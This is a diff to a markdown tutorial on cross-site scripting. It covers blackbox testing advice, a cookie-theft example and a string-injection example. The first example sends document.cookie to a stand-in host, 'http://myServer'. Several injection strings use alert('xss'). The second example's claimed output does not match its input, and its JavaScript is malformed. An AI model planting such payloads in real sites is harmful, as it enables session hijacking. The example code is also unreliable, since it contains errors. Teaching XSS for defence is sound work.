@@ -63,12 +63,27 @@ If the value of name is ```</h1><script>alert('xss');</script><h1>``` the browse
 
 * The best way to perform `black blackbox` XSS test in server is to use a `proxy`, `dirbust` the website and `analyze` all submitted data to the server and inject some HTML characters and analyse the server responses.
 From all the website submits, test with HTML chars (html entities), and look the render in browser. If it is not well escaped (the result is not HTML special character), probably the website is XSS vulnerable. 
-
+---
 ## Examples     
-### Example 1 : cookie thief 
+### Example 1 : cookie theft 
 ```
-    <img src="notExistImg" onerror="myFunction()"/>
+    <img src="nonExistImg" onerror="myFunction()"/>
     <script>function myFunction(){
 	window.location = "http://myServer/?cookie".concat("=", document.cookie);
+	}
     </script>
 ```
+
+### Example 2 : XSS with weak js function 
+
+```	
+    myFunction(){
+	myImg.src = document.getElementById('imgId').value; 
+	document.body.appendChild(myImg); 
+}
+
+```
+If the user sends ```'); alert('xss'); document.getElement('``` the code will become ```myImg.src = document.getElementById(''); alert('xss'); document.getElementById('imgId').value;```
+
+
+
